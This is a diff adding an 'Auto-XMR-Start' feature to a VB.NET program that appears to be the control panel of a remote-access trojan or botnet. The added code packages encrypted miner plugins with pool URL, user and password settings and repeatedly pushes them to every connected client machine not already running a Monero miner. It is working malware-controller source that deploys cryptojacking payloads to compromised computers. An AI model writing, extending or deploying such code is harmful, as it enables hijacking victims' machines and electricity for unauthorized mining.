@@ -1510,6 +1510,66 @@ Public Class Main
 
 #End Region
 
+
+#Region "Auto-XMR-Start"
+
+
+    Private Sub XMRAutostartStripMenuItem1_Click(sender As Object, e As EventArgs) Handles XMRAutostartStripMenuItem1.Click
+        Try
+            If L1.Items.Count > 0 Then
+                AutoStartXMRThread = New System.Threading.Thread(AddressOf AutoStartXMR)
+                AutoStartXMRThread.Start()
+            Else
+                MsgBox("UPS.. no Clients Found", MsgBoxStyle.Information)
+            End If
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
+
+    Private Sub XMRAutostartStopStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StopXMRAUTOSTARTToolStripMenuItem1.Click
+        Try
+            AutoStartXMRThread.Abort()
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    Dim AutoStartXMRThread As Threading.Thread
+    Private Sub AutoStartXMR()
+        Try
+            Dim miner As New XMR
+            miner.ShowDialog()
+            Dim MS As New IO.MemoryStream
+            Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
+            Dim F = Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\XMR.dll"))
+            Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "XMR-R|'P'|" + miner.cpu + "|'P'|" + miner.url + "|'P'|" + miner.user + "|'P'|" + miner.pass + "|'P'|" + F))
+            MS.Write(CMD, 0, CMD.Length)
+
+            While True
+                Messages("[INFO]", "Checking Clients for XMR Autostart")
+                For Each C As ListViewItem In L1.Items
+                    If miner.OK = True AndAlso miner.K = False Then
+                        If Not C.SubItems(XMR.Index).Text = "Running" Then
+                            S.SendData(C.Tag, MS.ToArray)
+                            Messages("[SUCCESS]", "Miner send")
+                        End If
+                    ElseIf miner.K = True Then
+                        S.Send(C.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "XMR-K|'P'|")
+                    End If
+                    Threading.Thread.Sleep(500)
+                Next
+
+                Threading.Thread.Sleep(50000)
+            End While
+        Catch ex As Exception
+        End Try
+    End Sub
+
+
+
+#End Region
+
 #End Region
 
 
